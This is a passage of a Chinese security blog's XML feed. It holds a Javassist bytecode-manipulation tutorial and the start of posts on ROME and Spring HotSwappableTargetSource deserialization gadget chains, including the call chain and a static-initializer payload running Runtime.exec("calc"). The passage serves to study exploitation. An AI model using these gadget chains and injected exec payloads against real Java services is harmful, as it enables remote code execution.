class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="HotSwappableTargetSource-链"><a href="#HotSwappableTargetSource-链" class="headerlink" title="HotSwappableTargetSource 链"></a>HotSwappableTargetSource 链</h4><p>spring 原生的 toString 利用链。</p><p>调用链如下</p><ul><li>HashMap.readObject</li><li>HashMap.putVal</li><li>HotSwappableTargetSource.equals</li><li>XString.equals</li><li>ToStringBean.toString</li></ul><p>这个链子由于作者第一次接触，需要完整分析一下，内容过长，所以单独写了一篇文章。</p><p>参见：<a href="https://changeyourway.github.io/2024/06/07/Java%20%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E7%AF%87-Rome%E9%93%BE%E4%B9%8BHotSwappableTargetSource%E9%93%BE/">漏洞篇 - Rome 链之 HotSwappableTargetSource 利用链</a> </p><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://goodapple.top/archives/1145">Java 安全学习 —— ROME 反序列化</a> </p><p><a href="https://www.yuque.com/5tooc3a/jas/mhy3k7vcrdteappp#amGm1">ROME 反序列化</a> </p>]]></content>
    
    
    <summary type="html">&lt;p&gt;ROME 是一个强大的 Java 库，用于解析和生成各种格式的 RSS 和 Atom feeds 。它兼容多种版本的 RSS（包括 RSS 0.90、0.91、0.92、0.93、0.94、1.0 和 2.0 ）和 Atom（包括 0.3 和 1.0 ）。ROME 提供了一个统一的 API ，简化了处理不同 feed 格式的复杂性。&lt;/p&gt;</summary>
    
    
    
    <category term="Java 安全" scheme="https://changeyourway.github.io/categories/Java-%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>基础篇 - Javassist 使用指南</title>
    <link href="https://changeyourway.github.io/2024/06/07/Java%20%E5%AE%89%E5%85%A8/%E5%9F%BA%E7%A1%80%E7%AF%87-javassist%E7%94%A8%E6%B3%95%E6%8C%87%E5%8D%97/"/>
    <id>https://changeyourway.github.io/2024/06/07/Java%20%E5%AE%89%E5%85%A8/%E5%9F%BA%E7%A1%80%E7%AF%87-javassist%E7%94%A8%E6%B3%95%E6%8C%87%E5%8D%97/</id>
    <published>2024-06-07T09:44:56.492Z</published>
    <updated>2024-06-07T09:47:58.565Z</updated>
    
    <content type="html"><![CDATA[<p>Javassist 是一个用于操作 Java 字节码的类库。Java 字节码存储在类文件的二进制文件中。每个类文件都包含一个 Java 类或接口。<br>类 Javassist.CtClass 是对类文件的抽象表示。（编译时类 CtClass ）对象是处理类文件的句柄（句柄 Handle 是一个是用来标识对象或者项目的标识符）。</p><span id="more"></span><h2 id="Javassist-介绍"><a href="#Javassist-介绍" class="headerlink" title="Javassist 介绍"></a>Javassist 介绍</h2><p>Javassist 是一个用于操作 Java 字节码的类库。Java 字节码存储在类文件的二进制文件中。每个类文件都包含一个 Java 类或接口。<br>类 Javassist.CtClass 是对类文件的抽象表示。（编译时类 CtClass ）对象是处理类文件的句柄（句柄 Handle 是一个是用来标识对象或者项目的标识符）。</p><h2 id="用法详解"><a href="#用法详解" class="headerlink" title="用法详解"></a>用法详解</h2><h4 id="依赖导入"><a href="#依赖导入" class="headerlink" title="依赖导入"></a>依赖导入</h4><p>首先需要导入 Javassist 依赖：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;org.javassist&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;javassist&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;3.28.0-GA&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure><h4 id="入门案例"><a href="#入门案例" class="headerlink" title="入门案例"></a>入门案例</h4><p>以下是一个简单的入门案例，演示如何使用 Javassist 动态创建一个类并添加方法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">import javassist.*;</span><br><span class="line"></span><br><span class="line">public class javassistTest &#123;</span><br><span class="line">    public static void createPseson() throws Exception &#123;</span><br><span class="line">    // 1. 获取类池</span><br><span class="line">        ClassPool pool = ClassPool.getDefault();</span><br><span class="line"></span><br><span class="line">        // 2. 创建一个 Person 类</span><br><span class="line">        CtClass cc = pool.makeClass(&quot;Person&quot;);</span><br><span class="line"></span><br><span class="line">        // 3. 添加一个 name 属性</span><br><span class="line">        CtField param = new CtField(pool.get(&quot;java.lang.String&quot;), &quot;name&quot;, cc);</span><br><span class="line">        // 访问级别是 private</span><br><span class="line">        param.setModifiers(Modifier.PRIVATE);</span><br><span class="line">        // 初始值是 &quot;zhangsan&quot;</span><br><span class="line">        cc.addField(param, CtField.Initializer.constant(&quot;zhangsan&quot;));</span><br><span class="line"></span><br><span class="line">        // 4. 生成 getter、setter 方法</span><br><span class="line">        cc.addMethod(CtNewMethod.setter(&quot;setName&quot;, param));</span><br><span class="line">        cc.addMethod(CtNewMethod.getter(&quot;getName&quot;, param));</span><br><span class="line"></span><br><span class="line">        // 5. 添加无参的构造函数</span><br><span class="line">        CtConstructor cons = new CtConstructor(new CtClass[]&#123;&#125;, cc);</span><br><span class="line">        cons.setBody(&quot;&#123;name = \&quot;lisi\&quot;;&#125;&quot;);</span><br><span class="line">        cc.addConstructor(cons);</span><br><span class="line"></span><br><span class="line">        // 6. 添加有参的构造函数</span><br><span class="line">        cons = new CtConstructor(new CtClass[]&#123;pool.get(&quot;java.lang.String&quot;)&#125;, cc);</span><br><span class="line">        // $0=this / $1,$2,$3... 代表方法参数</span><br><span class="line">        cons.setBody(&quot;&#123;$0.name = $1;&#125;&quot;);</span><br><span class="line">        cc.addConstructor(cons);</span><br><span class="line"></span><br><span class="line">        // 7. 创建一个名为 printName 的方法，无参数，无返回值，输出 name 值</span><br><span class="line">        CtMethod ctMethod = new CtMethod(CtClass.voidType, &quot;printName&quot;, new CtClass[]&#123;&#125;, cc);</span><br><span class="line">        ctMethod.setModifiers(Modifier.PUBLIC);</span><br><span class="line">        ctMethod.setBody(&quot;&#123;System.out.println(name);&#125;&quot;);</span><br><span class="line">        cc.addMethod(ctMethod);</span><br><span class="line"></span><br><span class="line">        // 指定输出 .class 文件的路径</span><br><span class="line">        cc.writeFile(&quot;./src/main/java/&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            createPseson();</span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上面代码运行后会在 .&#x2F;src&#x2F;main&#x2F;java&#x2F; 路径下生成一个 Person.class 文件，内容如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">//</span><br><span class="line">// Source code recreated from a .class file by IntelliJ IDEA</span><br><span class="line">// (powered by FernFlower decompiler)</span><br><span class="line">//</span><br><span class="line"></span><br><span class="line">public class Person &#123;</span><br><span class="line">    private String name = &quot;zhangsan&quot;;</span><br><span class="line"></span><br><span class="line">    public void setName(String var1) &#123;</span><br><span class="line">        this.name = var1;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public String getName() &#123;</span><br><span class="line">        return this.name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public Person() &#123;</span><br><span class="line">        this.name = &quot;lisi&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public Person(String var1) &#123;</span><br><span class="line">        this.name = var1;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public void printName() &#123;</span><br><span class="line">        System.out.println(this.name);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="类池-ClassPool"><a href="#类池-ClassPool" class="headerlink" title="类池 ClassPool"></a>类池 ClassPool</h4><p>ClassPool是 CtClass 对象的容器。它按需读取类文件来构造 CtClass 对象，并且保存 CtClass 对象以便以后使用。需要注意的是 ClassPool 会在内存中维护所有被它创建过的 CtClass，当 CtClass 数量过多时，会占用大量的内存，API 中给出的解决方案是有意识的调用 CtClass 的 detach() 方法以释放内存。</p><p>主要方法有以下几个：</p><ul><li>getDefault：获取默认的 ClassPool 对象。</li><li>get、getCtClass：根据类名获取 CtClass 对象，用于操作类的字节码。</li><li>makeClass：创建一个新的 CtClass 对象，用于新增类。</li><li>insertClassPath、appendClassPath：插入类搜索路径，提供给类加载器用于加载类。</li><li>toClass：将修改后的 CtClass 加载至当前线程的上下文类加载器中。通过调用 CtClass 的 toClass() 方法实现了将 CtClass 转换为 Class 对象，这样就可以在运行时使用这个类。需要注意的是一旦调用该方法，则无法继续修改已经被加载的 Class 对象。</li></ul><h4 id="CtClass-类"><a href="#CtClass-类" class="headerlink" title="CtClass 类"></a>CtClass 类</h4><p>CtClass 是 Javassist 中的一个抽象类，用于表示一个类文件。</p><p>CtClass 需要关注的方法：</p><ul><li>freeze：冻结一个类，使其不可修改。</li><li>isFrozen：判断一个类是否已被冻结。</li><li>prune：删除类不必要的属性，以减少内存占用。调用该方法后，许多方法无法将无法正常使用，慎用。</li><li>defrost：解冻一个类，使其可以被修改。如果事先知道一个类会被 defrost ， 则禁止调用 prune 方法。</li><li>detach：将该 class 从 ClassPool 中删除。</li><li>setSuperclass：设置当前类的父类。</li><li>writeFile：将 CtClass 对象转换为类文件并将其写入本地磁盘。</li><li>toClass：通过类加载器加载该 CtClass ，示例：<code>Class clazz = cc.toClass();</code> 。</li><li>toBytecode：获取 CtClass 的字节码，示例：<code>byte[] b = cc.toBytecode();</code> 。</li></ul><h4 id="CtMethod-和-CtField"><a href="#CtMethod-和-CtField" class="headerlink" title="CtMethod 和 CtField"></a>CtMethod 和 CtField</h4><p>CtMethod 和 CtField 分别代表 Java 类中的方法和字段。通过 CtClass 对象，可以获取、添加、删除或修改类中的方法和字段。这些对象提供了丰富的 API ，用于操作方法和字段的各种属性，如访问修饰符、名称、返回类型等。</p><p>CtMethod 中的一些重要方法：</p><ol><li>insertBefore：在方法的起始位置插入代码。</li><li>insterAfter：在方法的所有 return 语句前插入代码以确保语句能够被执行，除非遇到 exception 。</li><li>insertAt：在指定的位置插入代码。</li><li>setBody：将方法的内容设置为要写入的代码，当方法被 abstract 修饰时，该修饰符被移除。</li><li>make：创建一个新的方法。</li></ol><p>利用 CtMethod 中的 insertBefore，insterAfter，insertAt 等方法可以实现 AOP 增强功能。</p><h4 id="Javassist-基本操作"><a href="#Javassist-基本操作" class="headerlink" title="Javassist 基本操作"></a>Javassist 基本操作</h4><h6 id="定义一个新类"><a href="#定义一个新类" class="headerlink" title="定义一个新类"></a>定义一个新类</h6><p>要从头开始定义新类，ClassPool 中的 makeClass 必须被调用。.</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line"><span class="type">CtClass</span> <span class="variable">cc</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;Point&quot;</span>);</span><br></pre></td></tr></table></figure><p>该程序定义了一个不包含任何成员的 Point 类。Point 类的成员方法可以被 CtNewMethod中 的工厂方法声明，然后用 CtClass 中的 addMethod 方法追加到 Point 类中。</p><p>makeClass 方法无法创建一个新的接口，但是 ClassPool 中的 makeInterface 方法可以创建。接口中的成员方法可以被 CtNewMethod 中的 abstractMethod 方法创建。这样去标记一个接口的方法为抽象方法。</p><h6 id="冻结类"><a href="#冻结类" class="headerlink" title="冻结类"></a>冻结类</h6><p>如果一个 CtClass 对象由 writeFile 方法、toClass 方法或 toBytecode 方法转换成一个类文件，Javassist 将会冻结那个 CtClass 对象。从而不允许对那个 CtClass 对象进行进一步的修改。这是为了在开发人员尝试修改已加载的类文件时警告开发人员，因为 JVM 不允许重新加载类。译者注：Java 规范中规定，同一个 ClassLoader 对象中只能加载一次相同的 class 。</p><p>冻结的 CtClass 可以解冻，以便允许修改类定义。例如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">CtClasss cc = ...;        // 获取到 CtClass 对象</span><br><span class="line">    :  // 一系列操作</span><br><span class="line">cc.writeFile();  // 将 CtClass 对象转换成类文件，这步完成后 CtClass 对象将被冻结</span><br><span class="line">cc.defrost();  // 解冻</span><br><span class="line">cc.setSuperclass(...);    // 解冻后又可以对 CtClass 对象进行操作</span><br></pre></td></tr></table></figure><h6 id="指定类的加载路径"><a href="#指定类的加载路径" class="headerlink" title="指定类的加载路径"></a>指定类的加载路径</h6><p>默认的 ClassPool 对象由静态方法 ClassPool.getDefault() 返回，这个方法的搜索路径与底层 JVM ( Java virtual machine ) 的搜索路径相同。 如果程序在 JBoss 和 Tomcat 等 Web 应用程序服务器上运行，ClassPool 对象可能无法找到用户的类 ，因为对于这样的 Web 应用程序，服务器会使用多个类加载器以及系统类加载器加载。这种情况下，必须在 ClassPool 中注册一个额外的类路径，用于获取 CtClass  对象。</p><p><strong>本地路径</strong> </p><p>假设 pool 是一个 ClassPool 对象，可以指定一个类的搜索路径：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ClassPool pool = ClassPool.getDefault();</span><br><span class="line">pool.insertClassPath(&quot;/usr/local/javalib&quot;);</span><br></pre></td></tr></table></figure><p><strong>URL 路径</strong> </p><p>搜索路径不仅可以是一个目录，还可以是 URL：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ClassPath cp = new URLClassPath(&quot;www.javassist.org&quot;, 80, &quot;/java/&quot;, &quot;org.javassist.&quot;);</span><br><span class="line">pool.insertClassPath(cp);</span><br></pre></td></tr></table></figure><p>该程序将 <a href="http://www.javassist.org/java/">http://www.javassist.org:80/java/</a> 添加到类的搜索路径中。此 URL 仅用于搜索属于 org.javassist 包的类。例如，要加载一个类 org.javassist.test.Main ，它的类文件将从 <a href="http://www.javassist.org/java/org/javassist/test/Main.class">http://www.javassist.org:80/java/org/javassist/test/Main.class</a> 获取。</p><p><strong>从字节数组中获取 CtClass 对象</strong> </p><p>此外还可以直接将字节数组赋予 ClassPool 对象，然后根据那个数组构造一个 CtClass 对象：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">// 假设这是我们要从中读取的类的字节数组</span><br><span class="line">byte[] classBytes = getClassBytes(); // 这个方法应该返回实际的字节数组</span><br><span class="line">String className = &quot;com.example.MyClass&quot;; // 类的完全限定名</span><br><span class="line"></span><br><span class="line">// 获取默认的类池</span><br><span class="line">ClassPool pool = ClassPool.getDefault();</span><br><span class="line">// 将字节数组插入到类路径中</span><br><span class="line">pool.insertClassPath(new ByteArrayClassPath(className, classBytes));</span><br><span class="line">// 从类池中获取 CtClass 对象</span><br><span class="line">CtClass ctClass = pool.get(className);</span><br></pre></td></tr></table></figure><p>获得的 CtClass 对象就是 className 的字节码文件表示的类。如果 CtClass 的 get 方法被调用，并且参数 className 与 ByteArrayClassPath 中的 className 相同,那么 ClassPool 将会从 ByteArrayClassPath 给的路径中去读取类文件。</p><p><strong>从指定输入流中获取 CtClass 对象</strong> </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">// 获取默认的类池</span><br><span class="line">ClassPool pool = ClassPool.getDefault();</span><br><span class="line">// 指定的输入流，例如从一个文件中读取字节码</span><br><span class="line">InputStream inputStream = new FileInputStream(&quot;path/to/YourClass.class&quot;);</span><br><span class="line">// 从输入流中获取 CtClass 对象</span><br><span class="line">CtClass ctClass = pool.makeClass(inputStream);</span><br><span class="line">// 关闭输入流</span><br><span class="line">inputStream.close();</span><br></pre></td></tr></table></figure><h6 id="添加、删除、修改字段"><a href="#添加、删除、修改字段" class="headerlink" title="添加、删除、修改字段"></a>添加、删除、修改字段</h6><p>要在类中添加、删除或修改属性，需要使用 CtField 对象。假设已经获取到了一个名为 existingClass 的 CtClass 对象，以下示例展示了如何实现这些操作。</p><p><strong>添加字段</strong> </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">// 创建一个新的 CtField 对象，表示一个类型为 int，名称为 count，所属类为 existingClass 的字段</span><br><span class="line">CtField newField = new CtField(CtClass.intType, &quot;count&quot;, existingClass);</span><br><span class="line">// 将这个字段的修饰符设置为 private </span><br><span class="line">newField.setModifiers(Modifier.PRIVATE);</span><br><span class="line">// 将新创建的字段添加到 existingClass 类中</span><br><span class="line">existingClass.addField(newField);</span><br></pre></td></tr></table></figure><p><strong>删除字段</strong> </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">// 从 existingClass 对象中获取名为 fieldName 的字段</span><br><span class="line">CtField fieldToRemove = existingClass.getField(&quot;fieldName&quot;);</span><br><span class="line">// 移除该字段</span><br><span class="line">existingClass.removeField(fieldToRemove);</span><br></pre></td></tr></table></figure><p><strong>修改字段</strong> </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">// 从 existingClass 对象中获取名为 fieldName 的字段</span><br><span class="line">CtField fieldToModify = existingClass.getField(&quot;fieldName&quot;);</span><br><span class="line">// 修改该字段的修饰符为 public</span><br><span class="line">fieldToModify.setModifiers(Modifier.PUBLIC);</span><br></pre></td></tr></table></figure><h6 id="添加、删除、修改方法"><a href="#添加、删除、修改方法" class="headerlink" title="添加、删除、修改方法"></a>添加、删除、修改方法</h6><p>要在类中添加、删除或修改方法，需要使用 CtMethod 对象。同样假设已经获取到了一个名为 existingClass 的 CtClass 对象，以下示例展示了如何实现这些操作。</p><p><strong>添加方法</strong> </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">CtMethod newMethod = CtNewMethod.make(&quot;public int add(int a, int b) &#123; return a + b; &#125;&quot;, existingClass);</span><br><span class="line">existingClass.addMethod(newMethod);</span><br></pre></td></tr></table></figure><p><strong>删除方法</strong> </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">CtMethod methodToRemove = existingClass.getDeclaredMethod(&quot;methodName&quot;);</span><br><span class="line">existingClass.removeMethod(methodToRemove);</span><br></pre></td></tr></table></figure><p><strong>修改方法</strong> </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">CtMethod methodToModify = existingClass.getDeclaredMethod(&quot;methodName&quot;);</span><br><span class="line">methodToModify.setBody(&quot;&#123; return $1 * $1; &#125;&quot;);</span><br></pre></td></tr></table></figure><h6 id="添加构造方法"><a href="#添加构造方法" class="headerlink" title="添加构造方法"></a>添加构造方法</h6><p>假设已经获取到了一个名为 existingClass 的 CtClass 对象，为它创建一个具有两个参数（int 和 double）的构造方法，返回一个 CtConstructor 构造方法对象：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CtConstructor constructor = new CtConstructor(new CtClass[]&#123;CtClass.intType, CtClass.doubleType&#125;, ctClass);</span><br></pre></td></tr></table></figure><p>使用 setBody 方法设置构造方法的内容，$1 和 $2 分别代表构造方法的第一个和第二个参数：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">constructor.setBody(&quot;&#123; this.myInt = $1; this.myDouble = $2; &#125;&quot;);</span><br></pre></td></tr></table></figure><p>使用 addConstructor 方法将创建的构造方法添加到 existingClass 对象中：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">existingClass.addConstructor(constructor);</span><br></pre></td></tr></table></figure><h6 id="创建静态代码块并添加内容"><a href="#创建静态代码块并添加内容" class="headerlink" title="创建静态代码块并添加内容"></a>创建静态代码块并添加内容</h6><p>假设已经获取到了一个名为 existingClass 的 CtClass 对象，在其中创建一个静态初始化块需要用到 CtClass 的 makeClassInitializer 方法，方法的返回结果用 CtConstructor 对象接收：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CtConstructor constructor = existingClass.makeClassInitializer();</span><br></pre></td></tr></table></figure><p>CtConstructor 对象的 setBody 方法用于设置静态代码块中的内容：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">constructor.setBody(&quot;Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;);</span><br></pre></td></tr></table></figure><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://blog.csdn.net/qq_39072607/article/details/123900632">【 Javassist 官方文档翻译】第一章 读写字节码</a> </p><p><a href="http://www.51testing.com/html/80/15326880-7795600.html">一文掌握 Javassist ：Java 字节码操作神器详解</a> </p><p><a href="https://www.cnblogs.com/rickiyang/p/11336268.html">javassist 使用全解析</a> </p>]]></content>
    
    
    <summary type="html">&lt;p&gt;Javassist 是一个用于操作 Java 字节码的类库。Java 字节码存储在类文件的二进制文件中。每个类文件都包含一个 Java 类或接口。&lt;br&gt;类 Javassist.CtClass 是对类文件的抽象表示。（编译时类 CtClass ）对象是处理类文件的句柄（句柄 Handle 是一个是用来标识对象或者项目的标识符）。&lt;/p&gt;</summary>
    
    
    
    <category term="Java 安全" scheme="https://changeyourway.github.io/categories/Java-%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>漏洞篇 - Rome 链之 HotSwappableTargetSource 利用链</title>
    <link href="https://changeyourway.github.io/2024/06/07/Java%20%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E7%AF%87-Rome%E9%93%BE%E4%B9%8BHotSwappableTargetSource%E9%93%BE/"/>
    <id>https://changeyourway.github.io/2024/06/07/Java%20%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E7%AF%87-Rome%E9%93%BE%E4%B9%8BHotSwappableTargetSource%E9%93%BE/</id>
    <published>2024-06-07T09:44:56.491Z</published>
    <updated>2024-06-11T03:14:35.976Z</updated>
    
    <content type="html"><![CDATA[<p>HotSwappableTargetSource 是在 Spring AOP 中出现的一个类。作用是可以在代理 bean 运行过程中，动态更新实际 bean 对象。HotSwappableTargetSource 类实现了 TargetSource 接口。对外暴露 getTarget 方法，提供真正的 target 对象。再说的明白一点，HotSwappableTargetSourc 是对真正 target 对象的封装。在 Spring 的源码中，体现在 JdkDynamicAopProxy 中的 invoke 方法中。</p><span id="more"></span><h2 id="HotSwappableTargetSource-利用链"><a href="#HotSwappableTargetSource-利用链" class="headerlink" title="HotSwappableTargetSource 利用链"></a>HotSwappableTargetSource 利用链</h2><p>spring 原生的 toString 利用链。</p><p>调用链如下：</p><ul><li>HashMap.readObject</li><li>HashMap.putVal</li><li>HotSwappableTargetSource.equals</li><li>XString.equals</li><li>ToStringBean.toString</li></ul><h4 id="HotSwappableTargetSource-介绍"><a href="#HotSwappableTargetSource-介绍" class="headerlink" title="HotSwappableTargetSource 介绍"></a>HotSwappableTargetSource 介绍</h4><p>HotSwappableTargetSource 是在 Spring AOP 中出现的一个类。作用是可以在代理 bean 运行过程中，动态更新实际 bean 对象。HotSwappableTargetSource 类实现了 TargetSource 接口。对外暴露 getTarget 方法，提供真正的 target 对象。再说的明白一点，HotSwappableTargetSourc 是对真正 target 对象的封装。在 Spring 的源码中，体现在 JdkDynamicAopProxy 中的 invoke 方法中。</p><p>摘自 <a href="https://blog.csdn.net/qq_39839075/article/details/106974967">HotSwappableTargetSource 的使用</a> </p><h4 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h4><p>需要导入 Spring 依赖：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;org.springframework&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;spring-core&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;5.3.28&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br><span class="line">&lt;!-- https://mvnrepository.com/artifact/org.springframework/spring-beans --&gt;</span><br><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;org.springframework&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;spring-beans&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;5.3.28&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;org.springframework&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;spring-context&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;5.3.28&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure><h4 id="XString-equals-Object"><a href="#XString-equals-Object" class="headerlink" title="XString#equals(Object)"></a>XString#equals(Object)</h4><p>这个方法会调用参数 obj2 对象的 toString() 方法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">public boolean equals(Object obj2)</span><br><span class="line">&#123;</span><br><span class="line">  if (null == obj2)</span><br><span class="line">    return false;</span><br><span class="line"></span><br><span class="line">    // In order to handle the &#x27;all&#x27; semantics of</span><br><span class="line">    // nodeset comparisons, we always call the</span><br><span class="line">    // nodeset function.</span><br><span class="line">  else if (obj2 instanceof XNodeSet)</span><br><span class="line">    return obj2.equals(this);</span><br><span class="line">  else if(obj2 instanceof XNumber)</span><br><span class="line">      return obj2.equals(this);</span><br><span class="line">  else</span><br><span class="line">  // 调用 obj2 的 toString() 方法</span><br><span class="line">    return str().equals(obj2.toString());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>所以只需要传入一个 ToStringBean 对象即可。</p><h4 id="HotSwappableTargetSource-equals-Object"><a href="#HotSwappableTargetSource-equals-Object" class="headerlink" 